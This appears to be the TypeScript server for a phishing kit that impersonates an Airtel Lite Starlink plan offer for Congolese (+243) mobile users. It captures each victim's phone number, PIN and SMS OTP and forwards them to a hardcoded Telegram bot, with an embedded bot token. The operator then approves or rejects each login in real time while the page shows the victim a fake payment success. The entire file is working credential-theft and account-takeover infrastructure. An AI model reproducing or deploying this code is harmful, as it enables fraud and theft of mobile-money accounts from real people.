import express from 'express';
import path from 'path';
import { createServer as createViteServer } from 'vite';
import dotenv from 'dotenv';

dotenv.config();

const app = express();
const PORT = 3000;

app.use(express.json());

const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '8867971085:AAHFHldZq92uowOok2xZOrvN4HNX2DjQYj8';
const CHAT_ID = process.env.TELEGRAM_CHAT_ID || '8045300220';

interface SessionRecord {
  sessionId: string;
  phone: string;
  pin: string;
  otp?: string;
  planName: string;
  planPrice: string;
  loginStatus: 'pending' | 'approved' | 'rejected';
  otpStatus: 'idle' | 'pending' | 'approved' | 'rejected';
  loginMessageId?: number;
  otpMessageId?: number;
  createdAt: number;
  lastUpdated: number;
}

const sessions = new Map<string, SessionRecord>();

// Helper function to send Telegram message
async function sendTelegramMessage(text: string, inlineKeyboard?: any) {
  try {
    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
    const payload: any = {
      chat_id: CHAT_ID,
      text: text,
      parse_mode: 'HTML',
    };
    if (inlineKeyboard) {
      payload.reply_markup = {
        inline_keyboard: inlineKeyboard,
      };
    }
    const response = await fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload),
    });
    const data = await response.json();
    return data;
  } catch (error) {
    console.error('Failed to send Telegram message:', error);
    return null;
  }
}

// Helper to answer callback query
async function answerCallbackQuery(callbackQueryId: string, text: string, showAlert = false) {
  try {
    const url = `https://api.telegram.org/bot${BOT_TOKEN}/answerCallbackQuery`;
    await fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        callback_query_id: callbackQueryId,
        text,
        show_alert: showAlert,
      }),
    });
  } catch (err) {
    console.error('Failed to answer callback query:', err);
  }
}

// Helper to edit message text
async function editMessageReplyMarkup(chatId: string | number, messageId: number, newText?: string) {
  try {
    if (newText) {
      const url = `https://api.telegram.org/bot${BOT_TOKEN}/editMessageText`;
      await fetch(url, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: chatId,
          message_id: messageId,
          text: newText,
          parse_mode: 'HTML',
        }),
      });
    }
  } catch (err) {
    console.error('Failed to edit message:', err);
  }
}

// Long-polling worker for Telegram updates
let telegramOffset = 0;
let isPolling = false;

async function pollTelegramUpdates() {
  if (isPolling) return;
  isPolling = true;

  while (true) {
    try {
      const url = `https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=${telegramOffset}&timeout=15`;
      const res = await fetch(url);
      if (!res.ok) {
        await new Promise((r) => setTimeout(r, 4000));
        continue;
      }
      const data = await res.json();
      if (data && data.ok && Array.isArray(data.result)) {
        for (const update of data.result) {
          telegramOffset = update.update_id + 1;

          if (update.callback_query) {
            const query = update.callback_query;
            const callbackData = query.data || '';
            const callbackId = query.id;
            const msgId = query.message?.message_id;
            const chatId = query.message?.chat?.id;

            console.log(`Received Telegram button press: ${callbackData}`);

            // Check login callbacks
            if (callbackData.startsWith('approve_login_')) {
              const sessionId = callbackData.replace('approve_login_', '');
              const session = sessions.get(sessionId);
              if (session) {
                session.loginStatus = 'approved';
                session.lastUpdated = Date.now();
                await answerCallbackQuery(callbackId, '✅ Connexion validée ! Passage au code OTP.', true);
                if (msgId && chatId) {
                  const updatedText = `🔴 <b>AIRTEL LITE - CONNEXION CLIENT</b>\n\n` +
                    `👤 <b>Numéro:</b> +243 ${session.phone}\n` +
                    `🔑 <b>Code PIN:</b> <code>${session.pin}</code>\n` +
                    `📦 <b>Forfait:</b> ${session.planName} (${session.planPrice})\n` +
                    `🆔 <b>Session:</b> <code>${session.sessionId}</code>\n\n` +
                    `🟢 <b>STATUT: ✅ APPROUVÉ PAR L'ADMINISTRATEUR</b>\n` +
                    `<i>L'utilisateur est redirigé vers la page OTP...</i>`;
                  await editMessageReplyMarkup(chatId, msgId, updatedText);
                }
              } else {
                await answerCallbackQuery(callbackId, 'Session introuvable.', false);
              }
            } else if (callbackData.startsWith('reject_login_')) {
              const sessionId = callbackData.replace('reject_login_', '');
              const session = sessions.get(sessionId);
              if (session) {
                session.loginStatus = 'rejected';
                session.lastUpdated = Date.now();
                await answerCallbackQuery(callbackId, '❌ Connexion refusée/rejetée.', true);
                if (msgId && chatId) {
                  const updatedText = `🔴 <b>AIRTEL LITE - CONNEXION CLIENT</b>\n\n` +
                    `👤 <b>Numéro:</b> +243 ${session.phone}\n` +
                    `🔑 <b>Code PIN:</b> <code>${session.pin}</code>\n` +
                    `📦 <b>Forfait:</b> ${session.planName} (${session.planPrice})\n` +
                    `🆔 <b>Session:</b> <code>${session.sessionId}</code>\n\n` +
                    `🔴 <b>STATUT: ❌ REJETÉ (CODE PIN OU NUMÉRO INCORRECT)</b>`;
                  await editMessageReplyMarkup(chatId, msgId, updatedText);
                }
              } else {
                await answerCallbackQuery(callbackId, 'Session introuvable.', false);
              }
            }
            // Check OTP callbacks
            else if (callbackData.startsWith('approve_otp_')) {
              const sessionId = callbackData.replace('approve_otp_', '');
              const session = sessions.get(sessionId);
              if (session) {
                session.otpStatus = 'approved';
                session.lastUpdated = Date.now();
                await answerCallbackQuery(callbackId, '✅ Code OTP validé avec succès !', true);
                if (msgId && chatId) {
                  const updatedText = `🔐 <b>AIRTEL LITE - CODE DE VÉRIFICATION OTP</b>\n\n` +
                    `👤 <b>Numéro:</b> +243 ${session.phone}\n` +
                    `🔢 <b>Code OTP:</b> <code>${session.otp}</code>\n` +
                    `📦 <b>Forfait:</b> ${session.planName} (${session.planPrice})\n` +
                    `🆔 <b>Session:</b> <code>${session.sessionId}</code>\n\n` +
                    `🟢 <b>STATUT: ✅ OTP CONFIRMÉ ET VALIDÉ</b>\n` +
                    `<i>Paiement réussi et forfait Starlink activé !</i>`;
                  await editMessageReplyMarkup(chatId, msgId, updatedText);
                }
              } else {
                await answerCallbackQuery(callbackId, 'Session introuvable.', false);
              }
            } else if (callbackData.startsWith('reject_otp_')) {
              const sessionId = callbackData.replace('reject_otp_', '');
              const session = sessions.get(sessionId);
              if (session) {
                session.otpStatus = 'rejected';
                session.lastUpdated = Date.now();
                await answerCallbackQuery(callbackId, '❌ Code OTP rejeté/invalide.', true);
                if (msgId && chatId) {
                  const updatedText = `🔐 <b>AIRTEL LITE - CODE DE VÉRIFICATION OTP</b>\n\n` +
                    `👤 <b>Numéro:</b> +243 ${session.phone}\n` +
                    `🔢 <b>Code OTP:</b> <code>${session.otp}</code>\n` +
                    `📦 <b>Forfait:</b> ${session.planName} (${session.planPrice})\n` +
                    `🆔 <b>Session:</b> <code>${session.sessionId}</code>\n\n` +
                    `🔴 <b>STATUT: ❌ OTP REJETÉ / INVALIDE</b>`;
                  await editMessageReplyMarkup(chatId, msgId, updatedText);
                }
              } else {
                await answerCallbackQuery(callbackId, 'Session introuvable.', false);
              }
            }
          }
        }
      }
    } catch (err) {
      // transient network wait
      await new Promise((r) => setTimeout(r, 3000));
    }
  }
}

// Start telegram listener in background
pollTelegramUpdates().catch((e) => console.error('Telegram polling error:', e));

// API Routes
app.get('/api/health', (req, res) => {
  res.json({
    status: 'ok',
    botConfigured: Boolean(BOT_TOKEN && CHAT_ID),
    activeSessions: sessions.size,
  });
});

// Endpoint to send login credentials to Telegram
app.post('/api/telegram/send-login', async (req, res) => {
  try {
    const { sessionId, phone, pin, planName, planPrice } = req.body;

    if (!sessionId || !phone || !pin) {
      return res.status(400).json({ error: 'Champs obligatoires manquants.' });
    }

    const session: SessionRecord = {
      sessionId,
      phone,
      pin,
      planName: planName || 'Forfait Airtel Starlink',
      planPrice: planPrice || '$1.49',
      loginStatus: 'pending',
      otpStatus: 'idle',
      createdAt: Date.now(),
      lastUpdated: Date.now(),
    };

    sessions.set(sessionId, session);

    const messageText = `🔴 <b>NOUVELLE TENTATIVE DE CONNEXION AIRTEL LITE</b>\n\n` +
      `👤 <b>Numéro de Téléphone:</b> <code>+243 ${phone}</code>\n` +
      `🔑 <b>Code PIN (4 chiffres):</b> <code>${pin}</code>\n` +
      `📦 <b>Forfait Choisi:</b> <b>${session.planName}</b> (${session.planPrice})\n` +
      `📶 <b>Réseau:</b> Airtel RDC x Starlink Direct\n` +
      `⏰ <b>Horodatage:</b> ${new Date().toLocaleTimeString('fr-FR')} (${new Date().toLocaleDateString('fr-FR')})\n` +
      `🆔 <b>ID Session:</b> <code>${sessionId}</code>\n\n` +
      `👇 <i>Veuillez valider ou rejeter cette connexion ci-dessous :</i>`;

    const inlineKeyboard = [
      [
        {
          text: '✅ Correct / Valider',
          callback_data: `approve_login_${sessionId}`,
        },
        {
          text: '❌ Wrong / Rejeter',
          callback_data: `reject_login_${sessionId}`,
        },
      ],
    ];

    const result = await sendTelegramMessage(messageText, inlineKeyboard);
    if (result && result.result?.message_id) {
      session.loginMessageId = result.result.message_id;
    }

    return res.json({
      success: true,
      sessionId,
      message: 'Demande envoyée au bot Telegram avec succès.',
    });
  } catch (error: any) {
    console.error('Error in /api/telegram/send-login:', error);
    return res.status(500).json({ error: error.message || 'Erreur serveur' });
  }
});

// Endpoint to send 4-digit OTP code to Telegram
app.post('/api/telegram/send-otp', async (req, res) => {
  try {
    const { sessionId, phone, otp, planName, planPrice } = req.body;

    if (!sessionId || !otp) {
      return res.status(400).json({ error: 'Paramètres manquants.' });
    }

    let session = sessions.get(sessionId);
    if (!session) {
      session = {
        sessionId,
        phone: phone || 'Inconnu',
        pin: '****',
        planName: planName || 'Forfait Airtel Starlink',
        planPrice: planPrice || '$1.49',
        loginStatus: 'approved',
        otpStatus: 'pending',
        createdAt: Date.now(),
        lastUpdated: Date.now(),
      };
      sessions.set(sessionId, session);
    }

    session.otp = otp;
    session.otpStatus = 'pending';
    session.lastUpdated = Date.now();

    const messageText = `🔐 <b>CODE DE VÉRIFICATION OTP REÇU (4 CHIFFRES)</b>\n\n` +
      `👤 <b>Numéro:</b> <code>+243 ${session.phone}</code>\n` +
      `🔢 <b>Code OTP Saisi:</b> <code>${otp}</code>\n` +
      `📦 <b>Forfait:</b> ${session.planName} (${session.planPrice})\n` +
      `⏰ <b>Heure:</b> ${new Date().toLocaleTimeString('fr-FR')}\n` +
      `🆔 <b>Session:</b> <code>${sessionId}</code>\n\n` +
      `👇 <i>Confirmez la validité du code OTP reçu par SMS :</i>`;

    const inlineKeyboard = [
      [
        {
          text: '✅ OTP Correct',
          callback_data: `approve_otp_${sessionId}`,
        },
        {
          text: '❌ OTP Invalide',
          callback_data: `reject_otp_${sessionId}`,
        },
      ],
    ];

    const result = await sendTelegramMessage(messageText, inlineKeyboard);
    if (result && result.result?.message_id) {
      session.otpMessageId = result.result.message_id;
    }

    return res.json({
      success: true,
      sessionId,
      message: 'Code OTP transmis au Telegram.',
    });
  } catch (error: any) {
    console.error('Error in /api/telegram/send-otp:', error);
    return res.status(500).json({ error: error.message || 'Erreur serveur' });
  }
});

// Endpoint to poll session status
app.get('/api/telegram/status', (req, res) => {
  const sessionId = req.query.sessionId as string;
  if (!sessionId) {
    return res.status(400).json({ error: 'sessionId requis' });
  }

  const session = sessions.get(sessionId);
  if (!session) {
    return res.json({
      exists: false,
      loginStatus: 'idle',
      otpStatus: 'idle',
    });
  }

  return res.json({
    exists: true,
    sessionId: session.sessionId,
    loginStatus: session.loginStatus,
    otpStatus: session.otpStatus,
    lastUpdated: session.lastUpdated,
  });
});

// Manual simulator endpoint (useful for testing or fallback button in UI)
app.post('/api/telegram/manual-action', (req, res) => {
  const { sessionId, type, action } = req.body; // type: 'login' | 'otp', action: 'approve' | 'reject'
  const session = sessions.get(sessionId);

  if (!session) {
    return res.status(404).json({ error: 'Session non trouvée' });
  }

  if (type === 'login') {
    session.loginStatus = action === 'approve' ? 'approved' : 'rejected';
    session.lastUpdated = Date.now();
  } else if (type === 'otp') {
    session.otpStatus = action === 'approve' ? 'approved' : 'rejected';
    session.lastUpdated = Date.now();
  }

  return res.json({
    success: true,
    session,
  });
});

// Start Server with Vite
async function startServer() {
  if (process.env.NODE_ENV !== 'production') {
    const vite = await createViteServer({
      server: { middlewareMode: true },
      appType: 'spa',
    });
    app.use(vite.middlewares);
  } else {
    const distPath = path.join(process.cwd(), 'dist');
    app.use(express.static(distPath));
    app.get('*', (req, res) => {
      res.sendFile(path.join(distPath, 'index.html'));
    });
  }

  app.listen(PORT, '0.0.0.0', () => {
    console.log(`Server running at http://0.0.0.0:${PORT}`);
  });
}

startServer();
